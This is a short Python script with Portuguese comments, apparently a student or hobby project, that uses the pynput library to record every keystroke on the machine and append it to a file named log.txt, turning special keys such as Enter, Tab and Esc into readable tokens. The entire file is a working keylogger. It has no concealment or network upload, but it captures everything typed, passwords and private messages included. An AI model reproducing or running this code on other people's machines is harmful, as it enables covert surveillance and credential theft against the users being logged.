#importar a bilblioteca pynput para capturar eventos do teclado
from pynput import keyboard #impotar a biblioteca pynput para capturar eventos do teclado em tempo real
 
#ignorar algumas teclas desnecessárias no log
IGNORED_KEYS = {keyboard.Key.shift, 
                keyboard.Key.shift_r,
                keyboard.Key.ctrl_l,
                keyboard.Key.ctrl_r, 
                keyboard.Key.alt_l, 
                keyboard.Key.alt_r,
                keyboard.Key.caps_lock,
                keyboard.Key.cmd
            }
#vai ser chamada toda vez que for precionada uma tecla
def on_press(key):
    try:
        #se for uma tecla normal (letra,numero,simbolo
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORED_KEYS:
                pass
            else:
                f.write(f"[{key}]")

#iniciar o listener do teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()